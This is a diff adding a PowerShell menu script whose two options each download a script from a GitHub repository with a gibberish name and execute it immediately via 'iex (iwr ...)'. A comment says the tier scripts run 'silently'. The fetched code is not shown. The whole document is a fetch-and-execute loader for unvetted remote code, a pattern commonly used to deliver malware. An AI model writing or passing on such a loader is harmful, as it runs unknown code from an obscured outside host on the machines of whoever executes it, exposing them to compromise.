@@ -1,0 +1,22 @@
+# --- Functions to run Tier scripts silently ---
+function Run-Tier1 {
+iex (iwr "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%201" -UseBasicParsing).Content 
+}
+
+function Run-Tier2 {
+iex (iwr "https://raw.githubusercontent.com/8jke/XC8Z-cxc-Z8C7X8ZC7Zx-C8xc-Z/refs/heads/main/Tier%202" -UseBasicParsing).Content 
+}
+
+# --- Display menu ---
+Clear-Host
+Write-Host "1. Tier 1" -ForegroundColor DarkMagenta
+Write-Host "2. Tier 2" -ForegroundColor DarkMagenta
+
+# --- Wait for input ---
+while ($true) {
+    $key = [System.Console]::ReadKey($true).Key
+    switch ($key) {
+        "D1" { Run-Tier1 }
+        "D2" { Run-Tier2 }
+    }
+}
